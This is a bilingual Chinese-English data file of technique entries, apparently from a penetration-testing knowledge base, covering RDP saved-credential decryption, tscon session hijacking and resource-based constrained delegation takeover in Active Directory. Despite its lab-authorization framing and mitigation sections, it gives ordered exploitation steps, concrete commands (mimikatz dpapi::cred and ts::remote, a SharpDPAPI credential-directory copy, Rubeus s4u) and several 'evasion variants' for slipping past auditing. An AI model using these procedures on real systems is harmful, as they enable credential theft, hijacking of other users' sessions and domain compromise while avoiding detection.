description.en: Decrypt the local Credentials blob with mimikatz dpapi::cred; the recovered plaintext authenticates directly to the previously used RDP targets.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 RDP 配置与凭据引用审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for RDP Configuration and Credential-Reference Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: RDP 配置与凭据引用审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: RDP Configuration and Credential-Reference Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 解析出的 RDP 条目含主机与口令引用——报告脱敏到主机名级别，导出文件不保留完整凭据。
opsecTips.en: Redact parsed RDP entries to hostnames in the report and keep no full credential copies in exported files.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: RDP 文件离线解析规避变体

description.zh: 绕过 mstsc 交互审计：仅收集 .rdp 中 DPAPI blob 后离线解密。成功判据：blobs.txt 含 51:b 密文并可解。
description.en: Evades mstsc interactive auditing by collecting only the DPAPI blobs from .rdp files for offline decryption. Success: blobs.txt contains 51:b ciphertext that decrypts.

title.zh: cmdkey 静默枚举规避变体

description.zh: 绕过全量 cmdkey 输出的噪声审计：过滤仅保留目标终端服务器条目。成功判据：列出目标主机的保存凭据别名。
description.en: Evades noisy full cmdkey output auditing by filtering to target terminal-server entries only. Success: saved credential aliases for the target host are listed.

title.zh: 凭据目录批量离线规避变体

wafBypass.command: New-Item -ItemType Directory -Force C:\Windows\Temp\rdpc | Out-Null; Copy-Item "$env:LOCALAPPDATA\Microsoft\Credentials\*" C:\Windows\Temp\rdpc\ -Force; SharpDPAPI.exe blobs /target:C:\Windows\Temp\rdpc

description.zh: 绕过逐文件交互解密：整目录复制后统一离线解 blob。成功判据：批量解出 RDP 明文口令。
description.en: Evades per-file interactive decryption by copying the whole directory then decrypting blobs in bulk offline. Success: RDP plaintext passwords come out in batch.

description.zh: 递归查找 .rdp 连接文件；输出文件路径清单即定位完成，可检查其中保存的凭据引用。
description.en: Find .rdp connection files recursively; the printed path list completes locating for credential-reference review.

description.zh: 用 cmdkey /list 列出保存凭据；输出目标与用户名条目即确认存在可提取的存储凭据。
description.en: List saved credentials with cmdkey /list; printed target and username entries confirm extractable stored credentials.

title.zh: 解密本地 DPAPI 凭据文件
title.en: Decrypt the local DPAPI credential file

description.zh: 用 mimikatz dpapi::cred 解密本地 Credentials 目录中的 RDP 相关 DPAPI blob，还原保存的远程桌面凭据。
description.en: Uses mimikatz dpapi::cred to decrypt RDP-related DPAPI blobs in the local Credentials directory and recover saved remote-desktop credentials.

name.zh: RDP 会话隔离与接管防护审计
name.en: RDP Session Isolation and Takeover Protection Audit

description.zh: 以 SYSTEM 权限用 tscon 接管其他用户的断开会话，验证 RDP 会话隔离机制。
description.en: Uses tscon under SYSTEM to redirect another user's disconnected RDP session onto the operator's desktop without its password, verifying session isolation and disconnect-lock protections.

overview.zh: RDP 会话隔离与接管防护审计覆盖会话接管场景：针对已在目标主机获得 SYSTEM 或管理员上下文的测试主体，验证能否在无需目标口令的情况下接管其他用户的交互会话。验证维度涵盖会话枚举、tscon 重定向接管与 Mimikatz ts::remote 三条路径。
overview.en: RDP Session Isolation and Takeover Protection Audit covers session takeover: for a test principal already holding SYSTEM or administrator context on the target, verify whether other users' interactive sessions can be hijacked without their passwords. Verification dimensions cover session enumeration, tscon redirection takeover, and Mimikatz ts::remote.

vulnerability.zh: 根因是 tscon 以 SYSTEM 服务权限执行会话重定向，管理员或 SYSTEM 主体无需目标会话口令即可把他人会话接到自己桌面；未启用断开即锁定与凭据保护时，处于断开状态的特权会话成为直接接管目标。
vulnerability.en: The root cause is that tscon performs session redirection with SYSTEM service privileges, so an administrator or SYSTEM principal can attach another user's session to their own desktop without its password; when disconnect-lock and credential guard are absent, disconnected privileged sessions become direct takeover targets.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 query user 枚举会话，记录目标用户名、会话 ID 与状态（Active/Disconnect）；第 2 步用 tscon SESSION_ID /dest:console 把目标会话重定向到本机 console，获得其桌面且系统日志记录会话重连即确认成功；第 3 步用 Mimikatz ts::sessions 定位会话后以 ts::remote 复现接管。SESSION_ID 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 enumerates sessions with query user, recording the target username, session ID, and state (Active/Disconnect); step 2 redirects the target session to the local console with tscon SESSION_ID /dest:console — gaining its desktop plus a session-reconnect entry in the system log confirms success; step 3 locates sessions with Mimikatz ts::sessions and replays takeover via ts::remote. Replace the SESSION_ID placeholder via the global variables menu.

mitigation.zh:
特权账号启用断开即锁屏与屏保锁定策略，收紧会话接管权限并部署断开/空闲超时，监控 4778/4779 会话重连与 tscon 调用：
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxDisconnectionTime /t REG_DWORD /d 600000 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxIdleTime /t REG_DWORD /d 1800000 /f
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} | ? { $_.Message -match "tscon" }
    修复后用第 2 步样例回归，低权限主体接管他人会话应被拒绝并留痕。
mitigation.en: Enable disconnect-lock and screensaver lock policies for privileged accounts, tighten session-ownership takeover rights, and deploy RDP idle timeouts; monitor 4778/4779 session reconnects and tscon command-line invocations. After the fix, regress with the step 2 sample: takeover by a lower-privileged principal must be denied and logged.

description.zh: 在已控主机以 SYSTEM 运行 query user；列出断开或活动状态的高权限会话与 SESSION_ID 即锁定接管对象。
description.en: Run query user as SYSTEM on a controlled host; privileged sessions listed with their SESSION_IDs are the hijack targets.

title.zh: 接管会话免密进入桌面
title.en: Hijack a session without its password

description.zh: 用 tscon SESSION_ID /dest:console 把他人会话切到本地控制台；无需该用户口令即进入其桌面，直接可见已登录应用与文档。
description.en: Run tscon SESSION_ID /dest:console to switch someone's session to the local console; entering their desktop without the password exposes logged-in apps and documents.

title.en: Mine the hijacked session for secrets

description.zh: 用 mimikatz ts::sessions 列出会话并以 ts::remote /id 切入；在会话内执行命令或导出内存凭据即完成对高权限账号的控制。
description.en: List sessions with ts::sessions and enter via ts::remote /id; running commands or dumping in-memory credentials from the session completes control of the privileged account.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 RDP 会话隔离与接管防护审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for RDP Session Isolation and Takeover Protection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: RDP 会话隔离与接管防护审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: RDP Session Isolation and Takeover Protection Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 会话接管会断开真实用户——只对实验账号的断开会话操作，接管时长压到最短并立即归还。
opsecTips.en: Session takeover disconnects a real user — operate only on lab accounts' disconnected sessions, keep the takeover window minimal, and return the session immediately.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: SYSTEM 上下文接管规避变体

description.zh: 绕过普通用户无法 tscon 其他会话的限制与失败审计：以 SYSTEM 上下文执行接管。成功判据：物理控制台切换到目标会话。
description.en: Evades the privilege failure audit when a normal user runs tscon against another session by taking over in the SYSTEM context. Success: the physical console switches to the target session.

title.zh: mimikatz ts 远程规避变体

description.zh: 绕过 tscon 的独立命令审计：经 mimikatz 的 ts 模块走同一路径但进程特征不同。成功判据：会话进入远程查看状态。
description.en: Evades standalone tscon auditing by driving the same path through mimikatz's ts module with a different process signature. Success: the session enters remote-view state.

title.zh: 一行管道自动定位规避变体

description.zh: 绕过手动 query+tscon 两步操作的审计关联：单进程内定位并接管。成功判据：目标用户会话被切到 console。
description.en: Evades the audit correlation between a manual query and tscon by locating and taking over inside a single process. Success: the target user's session switches to console.

description.zh: 列出所有用户会话；成功时输出会话 ID、用户名与状态（Active/Disconnect）。
description.en: List all user sessions; output with session IDs, usernames, and states (Active/Disconnect) confirms success.

description.zh: 将目标会话重定向到 console 完成劫持；成功时获得该会话桌面且原用户被断开，系统日志记录会话重连。
description.en: Redirect the target session to the console to take it over; gaining that session desktop with the original user disconnected and a session-reconnect log entry confirms success.

explanation.en: Connect to the current console session

description.zh: 用 Mimikatz ts::remote 接管指定会话；成功时命令返回接管完成且可操作目标会话桌面。
description.en: Take over the specified session with Mimikatz ts::remote; the command reporting takeover with control of the target desktop confirms success.

name.zh: RBCD 委派属性与 ACL 审计
name.en: RBCD Delegation Attribute and ACL Audit

description.zh: 审计 RBCD 属性（msDS-AllowedToActOnBehalfOfOtherIdentity）的写入 ACL，验证基于约束委派的接管面。
description.en: Writes msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object with GenericWrite, creates a controlled machine account, and completes S4U2Self/S4U2Proxy to impersonate privileged users against that host, the RBCD takeover chain.

overview.zh: RBCD 委派属性与 ACL 审计覆盖基于资源的约束委派滥用场景：针对对目标计算机对象具有写权限的测试主体，验证能否设置 msDS-AllowedToActOnBehalfOfOtherIdentity 并模拟任意用户访问其服务。验证维度涵盖机器账号创建、委派属性写入与 S4U 票据请求三步链路。
overview.en: RBCD Delegation Attribute and ACL Audit covers resource-based constrained delegation abuse: for a test principal with write rights over the target computer object, verify whether msDS-AllowedToActOnBehalfOfOtherIdentity can be set to impersonate arbitrary users against its services. Verification dimensions cover machine-account creation, delegation attribute write, and S4U ticket requests.

vulnerability.zh: 根因是 RBCD 属性允许服务管理者指定可代表其受委派的身份，而对计算机对象持有 GenericAll/GenericWrite 的普通主体即可自行创建机器账号并写入该属性；S4U2Self/S4U2Proxy 随后产出以任意用户身份访问目标服务的可转发票据。
vulnerability.en: The root cause is that the RBCD attribute lets the service's manager designate identities allowed to delegate to it, and an ordinary principal holding GenericAll/GenericWrite on the computer object can create its own machine account and write that attribute; S4U2Self/S4U2Proxy then yields forwardable service tickets as any user against the target service.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 New-MachineAccount 创建受控机器账号；第 2 步用 Set-ADComputer -PrincipalsAllowedToDelegateToAccount 把该账号写入目标计算机的委派属性，读取 msDS-AllowedToActOnBehalfOfOtherIdentity 出现对应 SID 即确认成功；第 3 步用 Rubeus s4u 以机器账号哈希请求针对 CIFS 服务的模拟票据，取得 Administrator 身份的票据即确认完整链路。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 creates the controlled machine account with New-MachineAccount; step 2 writes it into the target computer's delegation attribute with Set-ADComputer -PrincipalsAllowedToDelegateToAccount — the SID appearing in msDS-AllowedToActOnBehalfOfOtherIdentity confirms success; step 3 requests an impersonation ticket for the CIFS service with Rubeus s4u using the machine-account hash — an Administrator-identity ticket confirms the full chain. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
移除普通账号对计算机对象的写权限并清空 RBCD 委派属性，MAQ 置 0，监控带 S4U 标记的 4769：
    Set-ADComputer -Identity 'target$' -Clear PrincipalsAllowedToDelegateToAccount
    Set-ADObject -Identity (Get-ADRootDSE).defaultNamingContext -Replace @{'ms-DS-MachineAccountQuota' = 0}
    dsacls "CN=target,OU=Servers,DC=corp,DC=local" /R "CORP\helpdesk"
mitigation.en: Remove ordinary accounts' write rights over computer objects, set ms-DS-MachineAccountQuota to 0 or tighten creation rights, audit unexpected delegation attribute values periodically, and monitor 4769 requests with S4U flags. After the fix, regress with the step 2 sample: the attribute write must be denied by the directory.

description.zh: 用 New-MachineAccount 以普通域用户创建受控机器账号；返回账号名与密码即获得 RBCD 委派载体。
description.en: Create a controlled machine account with New-MachineAccount as a normal user; the returned name and password are the RBCD delegation vehicle.

description.zh: 用 Set-ADComputer 把目标 PrincipalsAllowedToDelegateToAccount 指向傀儡账号；属性回查生效即劫持基于资源的约束委派。
description.en: Point the target's PrincipalsAllowedToDelegateToAccount at the puppet with Set-ADComputer; the attribute sticking on re-read hijacks resource-based constrained delegation.

description.zh: 用 Rubeus s4u 以傀儡账号申请冒充 Administrator 的 CIFS 票据；注入后以管理员身份访问目标文件服务即完成接管。
description.en: Request an Administrator-impersonating CIFS ticket with Rubeus s4u from the puppet; injecting it and reaching the target's file service completes takeover.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写
